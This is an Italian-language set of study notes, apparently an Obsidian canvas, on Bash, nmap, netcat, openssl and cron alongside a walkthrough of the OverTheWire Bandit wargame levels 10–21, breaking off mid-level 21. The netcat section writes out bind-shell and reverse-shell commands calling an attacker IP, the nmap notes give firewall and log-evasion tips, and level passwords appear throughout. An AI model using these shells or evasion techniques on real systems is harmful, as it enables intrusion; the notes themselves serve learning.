		{"id":"3d73dc291ec51cb6","type":"text","text":"# Bash - Espansioni, Espressioni, Logica\n\nPer avere il quadro completo manca il ruolo del meraviglioso operatore `$`.\n\n- ***`$f`*** (***espansione di variabile***) - Se `f` è una variabile, `$f` sostituisce il suo contenuto;\n- ***`$(comando)`*** (***espansione di comando***) - Ogni `comando` restituisce un certo output. Questa scrittura esegue `comando` e ne utilizza l'output in una espressione;\n- ***`$((algebra))`*** (***espressione algebrica***) - Questa scrittura esegue operazioni di `algebra` elementare. Non si possono innestare comandi (e.g. `du`) al suo interno!\n\nA questo dobbiamo aggiungere l'operatore di ***test logico*** per condizioni booleane. La scrittura è `[[ condizione ]]`, e restituisce il valore `True` o `False` della `condizione`.\n\n- ***Test su `file`*** - La scrittura `-X file` restituisce `True` se, per diversi `-X`, `file`\n\t- esiste (`-e`), è un file (`-f`), è una directory (`-d`), è non-vuoto (`-s`);\n\t- è leggibile (`-r`), scrivibile (`-w`) o eseguibile (`-x`);\n- ***Confronto tra `file`*** - La scrittura `file1 -nt file2` restituisce `True` se `file1` è più nuovo (i.e. ha data di modifica più recente) di `file2` (e viceversa con `-ot`);\n- ***Test su `stringa`*** - `-z str` restituisce `True` se `str` è vuota (non-vuota con `-n`);\n- ***Confronto tra `stringhe`*** - Classici operatori di `=`, `!=`, `>` e `<` (questi ultimi due a livello lessicografico). Molto è interessante è verificare se una `stringa` è il prodotto di una ***regex*** con la condizione `str =~ regex`;\n- ***Confronto tra numeri*** - Classici operatori `-eq`, `-ne`, `-lt` `-le`, `-gt`, `-ge`.\n\nPuoi combinare più `condizioni` secondo gli operatori `&& (AND)`, `|| (OR)` e `! (NOT)`.","x":3257,"y":6795,"width":759,"height":646,"color":"4"},
		{"id":"09449e1e2bf4e019","type":"text","text":"# Interpretare un `hexdump`\n\nTutto molto bello, ma posso fare così solo se sono io ad eseguire `hexdump -C`. Come faccio se trovo un file `hexdump` senza interfaccia user-friendly `-C`?\n\nPosso tornare al file originale con il comando `xxd`. Di per sé fa la stessa cosa di `hexdump`, ma a differenza di quest'ultimo ha una simpatica opzione `-r` per ***tornare indietro***.\n\n```bash\nxxd [opzioni] [file] [output]\n```\n\n- `-p` se hai un input di soli esadecimali (senza impaginazione user-friendly);\n- `-g [N]` ti permette di vedere `N byte` alla volta direttamente tradotti in `ASCII`.","x":5275,"y":7096,"width":759,"height":345,"color":"4"},
		{"id":"592cc115c760d58b","type":"text","text":"# Script Bash - Funzioni\n\nCi sono due modi equivalenti di dichiarare le funzioni:\n\n```bash\nfunction nome_funzione {\n    comando1\n    comando2\n}\n```\ne\n```bash\nnome_funzione() {\n    comando1\n    comando2\n}\n```\n\nIn ogni caso, i ***parametri*** non vanno passati tra parentesi.\n\n```bash\nsomma() {\n\techo $(( $1 + $2 ))\n}\n\nsomma 4 5    # Output: 9\n```\n\nIntuitivamente, `$N` è l'`N`-esimo parametro passato, dove `N` può essere qualsiasi (il numero di parametri letti dalla funzione è accessibile con `$#`). Posso poi prendere tutti i parametri insieme e trattarli come ***lista*** (`$@`) o come ***stringa*** (`$*`).\n\n`return` qui rappresenta il codice di uscita, ed è pertanto recuperabile con `$?` (restituisce il codice di uscita dell'ultimo comando eseguito) subito dopo la sua esecuzione.\n\nTutte le variabili dentro le funzioni sono intese come globali, salvo specifica `local`.\n\nUn'applicazione interessante è fare override di comandi noti, e.g.\n\n```bash\nls() {command ls --color=auto \"$@\"}\n\nls   # Usa ls con colori sempre attivi\n```","x":4266,"y":7676,"width":759,"height":935,"color":"4"},
		{"id":"fde5e59d70e6ddbe","type":"text","text":"# Compressione e Archiviazione\n\nL'idea alla base della compressione è la seguente: i dati sono spesso ridondanti, posso trovare una ***rappresentazione più compatta*** perdendo poca o nessuna informazione.\n\nIdealmente vorremmo una compressione ***lossless*** (senza perdita di informazione) per cose come codici e file di sistema. Come si ottiene?\n\n- ***Run-Length Encoding*** (***RLE***) - `AAAAAAAAAA` $\\to$ `10A`;\n- ***Dizionari*** - `ABCDABCDABCD` $\\to$ `ABCD[1,4]`;\n- ***Huffman Coding*** - `1010101011111000` $\\to$ `10 = A`, `11 = B`, `00 = C`$\\to$ `AAAABBAC`.\n\nPosso invece applicare compressioni ***lossy*** a file meno importanti (e.g. `jpeg` elimina alcuni dettagli poco visibili). Abbiamo diversi comandi/algoritmi built-in nella shell:\n\n- `gzip` - Compressione rapida, ma non ottimale. `gunzip` torna indietro, se specifico `-k` quando comprimo mantiene anche il file originale. Estensione `.gz`;\n- `bzip2` - Più lento, ma più ottimizzato. `bunzip2` torna indietro. Estensione `.bz2`;\n- `xz` - Lentissimo ma efficientissimo. `unxz` torna indietro. Estensione `.xz`.\n\nPer scegliere il file di destinazione tocca usare l'opzione `-c` (sceglie `stdout` come output) e poi reindirizzare sul file che voglio con un `>` finale.\n\n\"Ma perché vedo spesso la doppia estensione `.tar.gz`?\"\n\nQuesto accade quando si comprime (`.gz`) un ***archivio*** (`.tar`). E che roba è? Se devo mandare file multipli, non posso semplicemente inviare una `directory` (banalmente, lei è solo un'organizzazione logica dei puntatori agli `inodes` del `filesystem` locale). Allora creo un file `archivio` in cui metto tutti i file che voglio mandare. In pratica, è come fosse una `directory`, ma è un `file`. Chiaro, no?\n\nLinux usa tendenzialmente il comando `tar` (`Tape ARchive`) per gestire gli `archivi`.\n\n```bash\ntar [opzioni]\n```\n\n- `-c [input_files]`, `-x` - Rispettivamente, crea ed estrae un archivio. Devo sempre specificarne il nome, con `-f [target]`. Si usano quindi in genere insieme: `tar -cf [target] [input_files]` e `tar -xf [target]`;\n- Può integrare una compressione, usando `gzip` (`-z`), `bzip2` (`-j`) o `xz` (`-J`).","x":6284,"y":5900,"width":759,"height":951,"color":"4"},
		{"id":"d6df1ebc088bc55b","type":"text","text":"# Crittografia e Hashing\n\nIl cifrario di ***Cesare*** si può implementare con il comando `tr`:\n\n```bash\n cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\n```\n\nQuesto in particolare è ***rot13***, perché fa comodo (critta e decritta nello stesso verso).\n\nUna codifica molto comune è `base64` (`-d` per decrittare), con sintassi\n\n```bash\necho \"YW5nZWxvOmFuZ3Nw\" | base64 -d\n```\n\n\n\n","x":7294,"y":5900,"width":759,"height":951,"color":"3"},
		{"id":"0e6f99d9025a7954","type":"text","text":"# `openssl`\n\nUna roba per gestire e controllare i ***certificati***, nonché per ***crittare e decrittare*** messaggi.\n\n```bash\nopenssl [sub_command] [options]\n```\n\ndove chiaramente le `[options]` dipendono dal `[sub_command]`.\n\n- ***Gestione delle Chiavi*** - Usa `SSL/TLS` per le chiavi di cifratura (e.g. `openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:2048` genera una chiave privata `RSA`, e `openssl rsa -in private.key -pubout -out public.key` ne estrae la corrispondente chiave pubblica);\n- ***Gestione dei Certificati*** - <span style=\"color:rgb(236, 155, 14)\">Non mi va di scrivere sta roba, torna qui se serve.</span>\n\t- Un certificato ***SnakeOil*** è simpaticamente un modo per indicare gli autofirmati;\n- ***Connessione Crittata*** - Posso connettermi ad un server `SSL/TLS` lato client eseguendo `openssl s_client -connect [IP]:[port]`. Questo apre una connessione su CLI in stile `telnet`/`nc`, sulla quale tutto ciò che invio viene crittografato;\n\t- Con cosa? In fase di `handshaking`, il `client` invia una lista di cifrari supportati. Tra questi, il `server` sceglie il suo preferito;\n\t- In alternativa posso specificare quale voglio usare con `-cipher [algoritmo]`, ma a quel punto la domanda diventa: il `server` lo accetta? Diciamo che se sono io a configurarlo posso dirglielo, sempre con `-cipher`.","x":8303,"y":5900,"width":759,"height":951,"color":"3"},
		{"id":"2d903151dad0b196","type":"text","text":"# Esempi di `find`\n\n```bash\n# Trovare file modificati negli ultimi 2 giorni e comprimerli\nfind /var/log -type f -mtime -2 -exec gzip {} \\;\n\n# Trovare e cambiare owner a tutti i file appartenenti a un utente\nfind /home -user vecchioutente -exec chown nuovoUtente:nuovoGruppo {} \\;\n\n# Trovare i 10 file più grandi nel sistema\nfind / -type f -exec du -h {} + | sort -rh | head -n 10\n\n# Trova e sposta i file più vecchi di 30 giorni in una cartella di backup\nfind /var/log -type f -mtime +30 -exec mv {} /backup/logs/ \\;\n\n# Trova ed elimina file temporanei più vecchi di una settimana\nfind /tmp -type f -name \"*.tmp\" -mtime +7 -delete\n```\n\nOra iniziamo ad entrare in cose serie.\n\n```bash\n# File posseduti da utenti inesistenti (account eliminati ma file rimasti)\nfind / -nouser -o -nogroup\n\n# Trova file con permessi pericolosi\nfind / -type f -perm 0777\n\n# Cancella tutti i log\nfind /var/log -name \"*.log\" -exec rm {} \\;\n\n# Trova tutte le cartelle a cui posso accedere e in cui posso scrivere\nfind / -type d -exec test -r {} -a -w {} \\; -print 2>/dev/null\n```","x":6284,"y":2533,"width":759,"height":848,"color":"3"},
		{"id":"5cce19db2eacb68d","type":"file","file":"1 - Bandit Bash CTF/nmap_option_s.png","x":7294,"y":2964,"width":759,"height":417},
		{"id":"5cff47e4f204089c","type":"text","text":"# Bash - Manipolare Cose: `awk`","x":7295,"y":1086,"width":759,"height":957},
		{"id":"0ab6e3f18680f1a9","type":"text","text":"curl, watch, fc, ","x":7364,"y":2373,"width":620,"height":320,"color":"1"},
		{"id":"14bf4627959145d2","type":"text","text":"\n# **📊 `awk` - Il Coltellino Svizzero per Dati Testuali**\n\n`awk` è un linguaggio di scripting integrato nei sistemi Unix/Linux, usato per **analizzare, manipolare e trasformare** dati tabellari (testo strutturato in colonne).\n\n### **📌 Uso base**\n\n```bash\nawk '{print $1}' file.txt\n```\n\nStampa la **prima colonna** di ogni riga del file `file.txt`.\n\n### **📌 Opzioni avanzate**\n\n|Comando|Descrizione|\n|---|---|\n|`awk '{print $1, $3}' file.txt`|Stampa **prima e terza colonna**.|\n|`awk '/error/ {print $0}' log.txt`|Stampa le righe contenenti `\"error\"`.|\n|`awk -F: '{print $1}' /etc/passwd`|Usa `:` come separatore per estrarre i nomi utente.|\n|`awk '{sum += $2} END {print sum}' dati.txt`|Somma tutti i valori della **seconda colonna**.|\n|`awk 'NR==5' file.txt`|Stampa **solo la quinta riga**.|\n|`awk '{print NR, $0}' file.txt`|**Numera** ogni riga e la stampa.|\n\n### **🛠️ Trucchi da Hacker**\n\n1️⃣ **Trovare gli utenti con UID < 1000:**\n\n```bash\nawk -F: '$3 < 1000 {print $1, $3}' /etc/passwd\n```\n\n2️⃣ **Elencare i processi e la memoria che consumano:**\n\n```bash\nps aux | awk '{print $1, $2, $4 \"%\"}'\n```\n\n3️⃣ **Contare il numero di occorrenze di una parola in un file:**\n\n```bash\ngrep \"error\" log.txt | awk '{count++} END {print count}'\n```\n\n4️⃣ **Estrarre le richieste HTTP GET da un file di log:**\n\n```bash\nawk '$6 == \"\\\"GET\"' access.log\n```\n\n","x":8303,"y":982,"width":759,"height":1164},
		{"id":"ea6a4509f0ba551c","type":"text","text":"# Un Hacker si risveglia in una Rete sconosciuta...\n\nCosa fa?\n\n- ***Chi c'è nella rete?*** `nmap -sn 192.168.1.0/24` manda dei `ping` a tutta la sottorete, solo per vedere chi è attivo (non perde tempo a scansionare le porte);\n- ***Quali porte sono aperte?*** Poniamo che abbia trovato un dispositivo di suo interesse. Vediamo quali aperture offre con `nmap -p- 192.168.1.10`;\n- ***Cosa c'è dietro quelle porte?*** Abbiamo trovato aperte le porte `22`, `80` e `3306`. Ma che servizio offrono davvero? `nmap -sV -p 22,80,3306 192.168.1.10`!\n- ***Qual è il SO?*** `nmap -O 192.168.1.10`. Puoi specificargli di provare a dare una risposta anche se non ne è sicuro al $100\\%$ con `--osscan-guess`;\n- ***Possono rilevarmi?*** Di norma tutto quello che ho fatto finora lascia tracce nei log. Se arrivato a questo punto ho intenzione di fare cose un po' più sporche dovrei pormi il problema di non farmi rilevare. Posso sia rallentare lo scan (e.g. `-T1`) che evitare di chiudere le connessioni (e.g. `-sS`, così non mando l'`ACK` finale);\n- ***E se c'è un Firewall?*** Devo intanto capire se c'è. In genere tendono a bloccare tutti i pacchetti di connessioni non già aperte, quindi posso provare a mandare un `ACK` invece di un `SYN` (`nmap -sA 192.168.1.1`). In teoria questo gli farà pensare che è parte di una connessione già aperta, lasciandolo passare. Se invece viene bloccato anche così, significa che il `firewall` è forte (stateful) ed è più difficile da ingannare;\n\t- Ci sono poi tecniche più nerd per evadere il `firewall`, tipo frammentare i pacchetti (`-f`), cambiare la dimensione dei pacchetti (e.g. `-mtu 16`) o aggiungere dati casuali per eludere pattern di rilevamento noti (e.g. `--data-length 50`).\n- ***Ci sono vulnerabilità?*** `nmap` prevede la possibilità di testare vulnerabilità note con la direttiva `--script=XXX`, dove `XXX` può essere un tot di cose che cercherai se servono.","x":8303,"y":2533,"width":759,"height":848,"color":"4"},
		{"id":"3565595bf897b446","type":"text","text":"# Trasferire `files` in/da Remoto\n\nCi sono diverse alternative per copiare roba dal server remoto alla macchina da cui parte la connessione. Assumendo di conoscere il percorso dei file che mi interessano, posso\n\n- Loggare `ssh`, `cat` sui file che mi interessano e fare copia manuale. Se (come per il `livello 13`) devo copiare roba delicata come una chiave `RSA`, non è ottimale: potrei perdere informazioni di formattazione; \n- Usare il `Secure Copy Protocol` con sintassi `scp user@server:/file/on/server /target/on/my/pc` (per copiare qualcosa dal tuo pc al server inverti `source` e `target`). Ha opzioni per trasferire intere cartelle (`-r`) e per per farlo con compressione (`-C`);\n\t- ***Conviene usarlo se devo trasferire un solo file di cui conosco il path***.\n- Usare `Remote Sync`, sintassi `rsync user@server:/file/on/server /target/on/my/pc` (idem per l'inversione);\n\t- Un'***opzione*** molto interessante è ***`-a`***, che ***mantiene permessi***, timestamp e symlink. Mi conviene metterla perché `ssh` è schizzinoso, e accetta solo chiavi private con permessi `600` (i.e. solo il proprietario può fare `r/w`);\n\t- `-u` evita di sovrascrivere file con timestamp più recente;\n\t- `-v` (`verbose`) dà più info sul trasferimento;\n\t- `-z` comprime i file prima di inviarli;\n\t- Se usi il server come backup ed elimini un file in locale, al prossimo `rsync` vorresti che venga eliminato anche in remoto. Per questo esiste l'opzione `--delete`;\n\t- Se avevi iniziato un grosso trasferimento ma poi è saltata la luce, puoi ripetere il comando dicendogli di recuperare i dati che aveva già scaricato con `--partial`;\n\t- ***Conviene usarlo se ho tanta roba da trasferire***;\n- Usare `Secure File Transfer Protocol`. `sftp user@server` apre una connessione `SFTP` che si traduce in una shell interattiva che collega due `directory`: quella del `server`, nel quale navigo normalmente con i comandi della shell, e quella dell'`host`, nel quale navigo con gli stessi comandi con una `l` davanti (e.g. `lcd`, `lls`, ...);\n\t- Ho i comandi tipici di `FTP`: `get file_on_server.txt`, `put file_on_host.txt`;\n\t- Aggiungo `-r` per scaricare intere cartelle;\n\t- Uso `mget [files]` ed `mput [files]` per gestire file multipli;\n\t- Chiudo la connessione con `exit` o con `bye`;\n\t- ***Conviene usarlo se mi interessa navigare nel `server` per cercare cosa trasferire***.\n- Usare `netcat` (`nc`). Vedi il rettangolo più a destra.","x":7294,"y":3617,"width":759,"height":957,"color":"4"},
		{"id":"603628298b4df9a2","type":"text","text":"# Analizzare la Rete - `nmap`\n\nIn questo caso la mia ricerca parte dal fatto che volevo sapere cosa fosse il servizio sulla porta `30000` di `localhost`. L'ho capito? No, ma ci sono diverse cose interessanti.\n\n```bash\nnmap [options] [target]\n```\n\n fa una scansione delle porte aperte su `[target]` (nel nostro caso `localhost`, ci puoi mettere anche nomi che verranno risolti da `DNS`), provando a dirti che tipo di servizio offre ciascuna di esse. Puoi anche specificare\n\n- Più `[target]` separati da spazi (e.g. `localhost` `192.168.1.15` `google.com`);\n- Un intervallo di indirizzi `IP` (e.g. `192.168.1.1-100` fa uno scan dall'`host 1` al `100`);\n- Un'intera subnet (e.g. `192.168.1.0/24`).\n\nOvviamente più roba gli fai analizzare più ci mette, soprattutto se aggiungi le `[options]`:\n \n - `-pX` - Specifica le ***porte***. `X` può essere un numero (e.g. `-p 443`), un elenco di numeri (e.g. `-p 22, 80, 443`) in cui per ognuno specifico se testare `TCP` o `UDP` (e.g. `-p U:53,T:80,443`) o semplicemente un \"tutte le porte\" (`-p-`);\n\t - `--source port` permette di specificare la porta da cui faccio partire le richieste. Utile per ***bypassare i firewall*** (e.g. camuffandomi da richiesta `DNS`, porta `53`).\n - `-sX` - Specifica il ***tipo di scansione***. Non mi va di scriverle, vedi tabella e riquadri sopra. Aggiungo solo un paio di scansioni utili:\n\t - `-sV` - Riconosce servizi e versioni, spesso accoppiato con `--version-intensity X`, dove `X` definisce il rapporto `rapidità/efficienza` della scansione (da `0`, veloce ma poco affidabile, a `5`, lento ma accurato);\n\t - `-sS` - Il `SYN scan` è un altro trucco per essere stealth. Una connessione non completata ***potrebbe*** non essere salvata nei `log` di sistema.\n- `-PX` - Specifica il ***tipo di discovery*** (e.g. `-PE` è un `ping ICMP`, `-PR` è `ARP`). Se vuoi ignorare la discovery e fare uno scan di tutta la sottorete, `-Pn`.\n- `-TX` - Specifica la ***velocità*** dello scan, da `X = 0` (lentissimo, usato solo per bypassare IDS ultra-sensibili) a `5` (veloce e rumoroso, facilmente bloccato). Di default è `3`. Con `1` puoi stare abbastanza tranquillo, i `log` non dovrebbero registrarti;\n- `--script` - Permette di eseguire cose sulle porte trovate;\n- `-A` - In pratica è un \"all-in\" di molte altre opzioni (sarebbe `-O -sV --script=Default` + `traceroute`). Ovviamente è una roba rumorosissma e lentissima.","x":8303,"y":3617,"width":759,"height":957,"color":"4"},
		{"id":"19241c3faaf980ec","type":"text","text":"# Level 10, 11, 12\n\n10. Per decodificare `base64` abbiamo il comando... `base64 -d`.\n```\ndtR173fZKb0RRsDFSGsg2RWnpNVj3qRr\n```\n\n11. Implementiamo il cifrario di Cesare con chiave 13 (anche detto `rot13`, che per qualche strano motivo non ha una funzione che lo implementa direttamente, tocca usare `tr`).\n\n```\n7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4\n```\n\n12. Creiamo una cartella temporanea con `mktemp /tmp/mydir.XXX`. Non posso leggere `/tmp`, ma posso attraversarla. Copio `data.txt` in `mydir.ABC` e lo leggo. La prima riga dell'`hexdump` mi dice che è stato compresso con `gzip` (magic number `1f 8b`), quindi `xxd -r data.txt > unhex.txt.gz` (gli devi mettere l'estensione giusta, altrimenti si lamenta) per ricostruire il file compresso originale e `gunzip unhex.txt.gz` per estrarre `unhex.txt`. Costui è di nuovo un file binario, e non abbiamo idea della codifica in cui è scritto, quindi di nuovo `hexdump` (o `xxd`). Sorpresa! `42 5a` (che tra l'altro codificano `BZ` in `ASCII`), quindi rifacciamo lo stesso giochino con `bzip2`. Pensavo di aver finito, ma no! `1f 8b` è di nuovo il magic number di `gzip`. Ripetiamo.\n- Questo era il primo tentativo. Al secondo non mi faceva leggere la cartella `mydir.XXX`, boh. Ho trovato una cartella in cui potevo sia leggere che scrivere (`/run/lock`), ci ho abusivamente fatto una cartella e ho ricominciato il giochino di prima, stavolta usando `file` per controllare il formato dei risultati (invece dei magic numbers...). Così facendo scopriamo che il punto dove pensavo di aver finito al primo tentativo era in realtà metà del lavoro, perché quello era un file `.tar`! E poi `.gz`, e poi di nuovo `.tar`... Insomma, tutta così fino a `gunzip -c data8.bin.gz`, che contiene la `password`.\n\t- Nota per quando leggi l'`hexdump`: il primo archivio non aveva magic number noto, ma si potevano vedere i nomi dei file in esso contenuti, nella colonna `ASCII`!\n\n```\nFO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn\n```","x":6284,"y":4811,"width":759,"height":857,"color":"4"},
		{"id":"22b8634d71376455","type":"text","text":"# Level 13, 14, 15, 16\n\n13. Per usare `scp` sulla porta `2220`, `scp -P 2220 [resto del comando]`, mentre per `rsync` bisogna proprio dirgli di usare `ssh` con `rsync [options] -e \"ssh -p 2220\"`. Usiamo il primo. Non c'è `password`, ma ora abbiamo una `private key` in `~/.ssh`.\n14. Anzitutto, `chmod 600 ~/.ssh/sshkey.private` per settare i permessi della chiave privata (che altrimenti `ssh` piange). Quindi procediamo a specificare di usarla, con `ssh -p 2220 -i ~/.ssh/sshkey.private bandit14@bandit.labs.overthewire.org`. La password è in `/etc/bandit_pass/bandit14`, e va mandata a `localhost` sulla porta `30000`. Lo facciamo con `nc -v localhost 30000`, che ci restituisce la `password`.\n\n```\n8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo\n```\n\n15. Qui apriamo una connessione con `openssl` invece che con `nc`. Il comando completo  è `openssl s_client localhost:30001` e poi mandiamo la `password` precedente.\n\n```\nkSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx\n```\n\n16. Grazie ad uno `script` di `nmap` possiamo cercare direttamente le porte che parlano `SSL/TLS`: basta fare `nmap -p 31000-32000 --script ssl-cert localhost`. Ne risultano due server che parlano `ssl`, andando a tentativi troviamo che quello sulla porta `31790` non chiude subito la connessione. Inviando la `password` il server chiede un `KEYUPDATE`. Leggendo il manuale (i.e. facendolo leggere all'AI) troviamo che per rispondere a questa richiesta di aggiornare le chiavi devi inviare `R` o `K`. Non funziona ahahah\n\t- Ok, questa roba è incredibile. Visto che la vecchia password inizia con `k`, quando la mando al server questo vede la prima lettera ed assume che io gli stia mandando una richiesta di `KEYUPDATE`. Quindi? Esistono modi per impedire che le cose che scrivo vengano interpretate come comandi a caso. Qui in particolare bisogna mettere l'opzione `-quiet`. Quindi: `openssl s_client -quiet localhost:31790` e poi la `password`, che restituisce una chiave privata. La copiamo come prima tra le chiavi `ssh` e la usiamo per connetterci al livello `17`.","x":8303,"y":4811,"width":759,"height":857,"color":"4"},
		{"id":"df5e2abc8ea4b780","type":"text","text":"# Esempi di `grep`\n\n```bash\n# Stampa hello, hello123, hellothere\necho \"hello world, hello123, hellothere\" | grep -Eo 'hello\\w*'\n\n# Mostra solo i processi relativi a Firefox\nps aux | grep firefox\n\n# Estrae i soli numeri da un testo\necho \"ID: 123, User: 456, Code: 789\" | grep -Eo '[0-9]+'\n\n# Estrae i soli indirizzi IP da un file di log\ngrep -Eo \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" access.log\n\n# Estrae i soli indirizzi email da un file\ngrep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' file.txt\n\n# Trova password hardcoded\ngrep -r \"password\" /var/www/html/\n```","x":6284,"y":3617,"width":759,"height":957,"color":"3"},
		{"id":"3e59a8434e7f1e95","type":"text","text":"# Esempi avanzati di `nmap`\n\n```bash\n# Prova ad individuare uno sniffer sulla LAN 192.168.1.0/24\nnmap --script=sniffer-detect -Pn -n 192.168.1.0/24\n```\n\n","x":9312,"y":2533,"width":759,"height":848},
		{"id":"c77fc76ca3f24940","type":"text","text":"# Interagire con la Rete - `netcat` (`nc`)\n\nUn altro comando nella hall of fame dei più potenti. Di per sé è utile ad aprire connessioni, ma può fare molte cose (tanto che su alcune distribuzioni moderne è stato nerfato).\n\n```bash\nnc [options] [target]\n```\n\n- `-v [IP] [port]` apre una connessione `TCP` con il `[target]`. Funziona in modo simile a `Telnet`, posso inviare cose \"a mano\": se dall'altra parte ho un server `HTTP` posso ad esempio fare `GET / HTTP/1.1` e premere `ENTER` due volte, o come nel caso del `livello 14` magari il servizio è completamente homemade;\n\t- Se la porta è ***chiusa*** uscirà `Connection Refused`, se c'è un ***firewall*** che blocca la connessione il comando resterà bloccato, senza output;\n\t- `-v` di per sé potrei anche toglierlo (è `-verbose`), ma se lo faccio non esce scritto niente e potenzialmente non capisco cosa sta succedendo.\n- `-l -p [port]` si mette in ascolto (`-l`) sulla porta `[port]`;\n- `-u` usa `UDP` invece di `TCP`. Spesso usato per testare il `DNS` (e.g. `nc -u 192.168.1.1 53` controlla se un ipotetico default gateway è configurato come server `DNS`);\n- `-z -v [IP] [port_range]` fa una scansione simile a `nmap`. `-z` chiude la connessione subito dopo averla testata, e `-v` mostra i dettagli. `[port_range]` è `inizio-fine`;\n\t- Preferibile ad `nmap` in quanto più stealth.\n- Se la connessione non richiede autenticazione (e.g. su reti locali), posso realizzare un rapido trasferimento di file una senza usare roba tipo `FTP`. Sulla macchina ricevente predispongo un ascolto con `nc -l -p 1234 > received_file.txt`, mentre su quella che invia scrivo `cat toshare.txt | nc [IP] 1234`.\n\nOra, per quale motivo abbiamo detto che in alcune versioni `nc` viene nerfato? Il punto è che con l'opzione `-e` (`exec`) si può agilmente creare una ***backdoor***. Mi basta riuscire a far eseguire `nc -l -p 4444 -e /bin/bash` sul server, che di fatto associa alla connessione in ascolto sulla porta `4444` un terminale. Se dall'altra parte eseguo `nc -v [target IP] 4444`, tutto ***ciò che scrivo diventa l'input del terminale remoto***.\n\nSe questo non funziona (e.g. per un `firewall` restrittivo) posso usare una ***reverse shell***, i.e. fare questo stesso processo al contrario: io mi metto in ascolto in locale con `nc -l -p 4444` e faccio eseguire in remoto `nc [attacker IP] 4444 -e /bin/bash`. In questo modo è il server ad aprire una connessione verso l'esterno, il `firewall` di norma lascia passare. ","x":9312,"y":3617,"width":759,"height":957,"color":"4"},
		{"id":"8b08d7095bf54e0e","type":"text","text":"# `cron` & `crontab`\n\n`cron` è un demone che esegue comandi a orari specifici o intervalli regolari, `crontab` permette di interfacciarsi con essi. In particolare le opzioni di `crontab` sono\n\n- `-l` - Visualizza i `cronjob` (posso farlo anche guardando i file in `/ect/cron.d/`, o in `/ect/cron.daily/` specifica per quelli eseguiti una volta al giorno);\n-  `-e` - Modifica la `crontab`;\n- `-r` - Elimina il proprio `crontab`;\n- `-u user` - Se sei `root` puoi vedere la `crontab` dell'utente `user`.\n\nTutti i `cronjob` sono scritti nel formato\n\n```python\nMINUTO - ORA - GIORNO_DEL_MESE - MESE - GIORNO_DELLA_SETTIMANA - COMANDO\n```\n\nSe invece scrivo in `/etc/contab` o `/etc/cron.d/` devo aggiungere un campo `USER` prima del `COMANDO`. I range ammessi sono quelli ovvi, e in più abbiamo:\n\n- Per intendere \"qualsiasi\" si usa `*`, e per \"ogni tot\" abbiamo `*/tot` (e.g. `*/10 * * * *` significa eseguire il comando ogni 10 minuti indipendentemente dal giorno);\n- Posso specificare liste di valori separate da virgole (e.g. `1,2,5 * * * *` significa eseguire il comando ai minuti `1`, `2` e `5` di ogni ora di ogni giorno) o range con `-` (e.g. `1-5 * * * *` è all'inizio di ognuno dei primi 5 minuti di ogni ora di ogni giorno);\n- Esistono anche delle shortcut per alcune configurazioni notevoli, tipo\n\t- `@daily`per `0 0 * * *` (o analogo più preciso `@midnight`);\n\t- `@hourly` per `0 * * * *`;\n\t- `@weekly` per ` 0 0 * * 0`;\n\t- `@monthly` per `0 0 1 1 *`;\n\t- `@yearly` o `@annually` per `0 0 1 1 *`;\n\t- `@reboot` all'avvio del sistema (il che ovviamente diventa \"all'avvio di `cron`\").\n\nNota che lo schedule `* * * * *` significa eseguire il job ogni minuto.","x":10321,"y":3617,"width":759,"height":957,"color":"4"},
		{"id":"35928f1f2c7c2d2e","type":"text","text":"# Level 17, 18, 19\n\n17. ***Partendo dal livello 16*** (o comunque salvando in locale la chiave privata ivi trovata, tipo in [[SSH Private Key Level 16-17]], seguita dal classico `chmod 600`) entriamo al livello 17 con `ssh -p 2220 -i bandit17@bandit.labs.overthewire.org`. Eseguire `diff password.old password.new` restituisce `42c42` (i.e. è cambiata la riga `42`) e la nuova `password` che sta solo nel file `.new` (indicato con `>`, i.e. il secondo file).\n\n```\nx2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO\n```\n18. Qualcuno ha modificato `.bashrc` in modo tale che appena viene eseguito all'apertura della `shell` questo chiude la connessione `SSH`. La soluzione può essere quella di eseguire tutto quello che serve prima che la connessione venga chiusa. Abbiamo una simpatica opzione fatta apposta, i.e. `-T <comando>` (cfr. ***SSH***). Facciamo prima `ls` per vedere cosa c'è nella `home directory`, quindi `cat readme`.\n\n```\ncGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8\n```\n\n19. `bandit20-do` prende come argomento un comando da eseguire risultando l'utente `bandit20` (che è il proprietario ed ha il `SUID` attivo sull'esecuzione, i.e. l'eseguibile gira con i permessi dell'owner, mentre il gruppo `bandit19` può eseguire).\n```sh\n-rwsr-x---  1 bandit20 bandit19 14884 Apr 10 14:23 bandit20-do*\n```\n- Basta fare `./bandit20-do cat /etc/bandit_pass/bandit20`. Nota che se eseguo `./bandit20-do id` trovo `uid`, `gid` e `groups` che sono ancora tutti `11019` (i.e. utente `bandit19`), ma anche un `euid` (`effective uid`, i.e. quello usato dal SO per decidere con che permessi eseguire i comandi, mentre il `real uid` è quello di chi esegue il comando) che risulta invece quello di `bandit20`.\n\n```\n0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\n```","x":9312,"y":4811,"width":759,"height":857,"color":"4"},
		{"id":"dfe79e02c15ae627","type":"text","text":"# Level 20, 21\n\n20. Stesso gioco del `livello 19`: c'è un `setuid binary` (di nuovo, simpatico modo per dire `eseguibile con i permessi del proprietario`, in questo caso `bandit21`). Visto che nessuna delle porte TCP aperte in ascolto su `localhost` restituisce la password di questo livello mi sa che mi tocca scrivere un mini server che fa esattamente questo, e forse è per questo che mi suggerisce di usare `tmux` (da una parte il server, dall'altra il client). Spoiler: sì. Si può fare con il potentissimo `netcat`:\n```bash\n# Lato Server\n\techo -e \"0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\" | nc -l 1234\n\n# Lato Client\n\t./suconnect 1234\n\n# La nuova password\n\tEeoULMCra2q0dSkYj561DX7s1CpBuOBt\n```\n\n- Nota che così viene accettata una sola connessione. Per farlo restare up,\n```bash\nwhile true; do echo \"Ciao client!\" | nc -l -p 1234; done\n```\n\n21. Osservando i file in `/etc/cron.d/` notiamo che questi chiamano degli script del tipo `cronjob_bandit22.sh` in `/usr/bin`. Ce ne sono 